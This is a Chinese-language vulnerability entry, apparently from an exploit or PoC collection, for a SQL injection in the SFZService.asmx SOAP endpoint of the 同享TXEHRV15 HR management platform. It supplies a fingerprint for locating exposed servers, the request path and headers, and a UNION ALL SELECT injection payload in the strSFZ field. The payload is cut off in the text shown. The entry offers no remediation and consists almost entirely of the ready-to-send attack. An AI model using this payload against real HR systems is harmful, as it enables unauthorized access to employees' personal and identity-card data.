# 同享TXEHRV15人力管理管理平台SFZService.asmx存在SQL注入漏洞

- **系统**：同享TXEHRV15人力管理管理平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/Assistant/Default.aspx"`
- **请求**：`POST /Service/SFZService.asmx`
- **关键头**：`SOAPAction: [http://tempuri.org/GetEmployeeBySFZ](http://tempuri.org/GetEmployeeBySFZ)`　`Content-Type: text/xml;charset=UTF-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
\ xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n\
\      <tem:GetEmployeeBySFZ>\n         <!--type: string-->\n         <tem:strSFZ>1'\
\ UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,…（脚本共 1575 字，完整版见原文）
```
- **预期**：200　|　—